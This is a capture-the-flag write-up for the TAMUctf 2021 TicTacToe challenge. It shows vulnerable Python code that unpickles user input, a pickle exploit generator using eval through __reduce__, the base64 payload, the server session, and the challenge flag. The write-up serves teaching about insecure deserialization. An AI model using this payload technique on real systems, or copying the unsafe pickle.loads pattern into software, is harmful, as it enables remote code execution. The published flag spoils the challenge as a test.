---
title: "TAMUctf 2021 TicTacToe Solution"
slug: "tictactoe-writeup"
date: "2021-04-26 11:39:00.000000"
author_name: "Javantea"
author_email: "jvoss@altsci.com"
draft: false
toc: false
images:
---

TAMUctf 2021
[TicTacToe](https://ctftime.org/task/15801) - 150 points

>    Hey, I made a tic tac toe game! If you can beat me enough times I'll give you a flag.
>    [tictactoe](http://tamuctf.com/static-files/tictactoe)
>    `openssl s_client -connect tamuctf.com:443 -servername tictactoe -quiet`

I tried to solve this without looking at the source code for a while. Spoiler, this is not easy to solve without looking at the source code or at least knowing the vulnerability involved.

It turns out, I know this type of vulnerability quite well. In fact, I found it in a real-life security program. It's that common a vulnerability in real-life. The vulnerability is pickle. Pickle doesn't do deserialization in a safe way allowing for remote code execution as a result.

TicTacToe is actually a funny subcase of pickle vulnerability that doesn't allow direct exploitation of the normal style of pickle exploit (`os.system`). This probably threw a lot of people for a loop considering only 52 teams scored on this problem. Inexplicable!

The vulnerable source code:

```python
        elif selection == "4":
                save = input("What was the code I gave you last time? ")
                data = pickle.loads(base64.b64decode(save))

                if get_hash(data['wins']) != data['security']:
                        print("Hey, the secret code I left isn't correct.  You aren't trying to cheat are you :/")
                        continue
                else:
                        wins = data['wins']
                        print(f"Okay, that all checks out!  I'll mark you down as {wins} wins")
                pass
```


You can see that they are taking input from the user and passing it to `pickle.loads`. That's vulnerable to attacks.

The exploit generator:

```python
import binascii
import pickle
flag='fdsa'
class Exploit(object):
  def __reduce__(self):
    return (__builtins__.eval,('print(flag)',))

a = pickle.dumps(Exploit())
binascii.b2a_base64(a)
```

The exploit:
gASVJwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwLcHJpbnQoZmxhZymUhZRSlC4=

The attack in the form it took as I solved the problem:

```sh
openssl s_client -connect tamuctf.com:443 -servername tictactoe -quiet
depth=0 CN = hulkcybr1
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = hulkcybr1
verify return:1
Welcome to my new game!  I bet you can't beat me 133713371337 times!!  You've won 0 times. 
1. Play game
2. Redeem prize
3. Save progress
4. Load progress
5. Check stats
> 4
What was the code I gave you last time? gASVJwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwLcHJpbnQoZmxhZymUhZRSlC4=
gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}
Traceback (most recent call last):
  File "/pwn/game.py", line 149, in <module>
    if get_hash(data['wins']) != data['security']:
TypeError: 'NoneType' object is not subscriptable

```

The flag is `gigem{h3y_7h47_d035n'7_l00k_l1k3_4_p1ckl3d_54v3}`
